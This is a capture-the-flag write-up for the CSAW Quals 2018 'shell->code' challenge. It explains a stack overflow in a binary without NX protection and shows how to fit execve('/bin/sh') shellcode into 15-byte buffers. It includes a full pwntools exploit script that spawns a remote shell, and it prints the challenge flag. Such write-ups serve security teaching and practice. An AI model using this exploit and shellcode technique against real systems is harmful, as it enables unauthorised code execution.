In `CSAW Quals 2018 - shell_code` challenge, there is a simple `stack
overflow` vulnerability that leads to code injection and eventually, execution
of `/bin/sh`. The interesting part is that you cannot provide the whole shell
code in one place; however, you need to break your shell code into 3 parts,
feed each part to the program in a different place, and connect these 3 parts
using jumps.

Original writeup (https://github.com/sajjadium/ctf-
writeups/tree/master/CSAWQuals/2018/shell_code).## shell->code 100 (Pwn)

### Solution

The binary doesn't have NX enabled, it first ask for two 15 bytes input on
stack, and then ouput the address of node2 on stack (leak), finally ask for
your initials and has a 29 bytes buffer overflow.

For these 29 bytes, the return address starts at `buf+11` and we can easily
overwrite then return to the shellcode on stack. The problem is that we have
only 15 bytes for each buffer, not sufficient for a full `execve()` shellcode,
and the leak comes after we input our shellcodes, so I can't chain the buffers
together.

Finally I put "/bin/sh" after the return address, since rsp will point to it
after return, and making the shellcode fit inside 15 bytes by simply `mov rdi,
rsp`.

### Exploit  
```python  
#!/usr/bin/env python3  
from pwn import *  
context(arch="amd64")

r = remote("pwn.chal.csaw.io", 9005)

sc = """  
   mov rdi, rsp  
   /* call execve('rsp', 0, 0) */  
   push (SYS_execve) /* 0x3b */  
   pop rax  
   xor esi, esi /* 0 */  
   cdq /* rdx=0 */  
   syscall  
"""  
r.sendline(asm(sc))  
r.sendline("x")  
r.recvuntil("node.next: ")

leak = int(r.recv(14)[2:], 16)  
r.sendline(b"a" * 11 + p64(leak + 0x28) + b"/bin/sh\x00")  
r.interactive()  
```

### Flag

```  
flag{NONONODE_YOU_WRECKED_BRO}  
```  

Original writeup (https://github.com/jaidTw/ctf-
writeups/blob/master/csaw-2018/shellpointcode.md).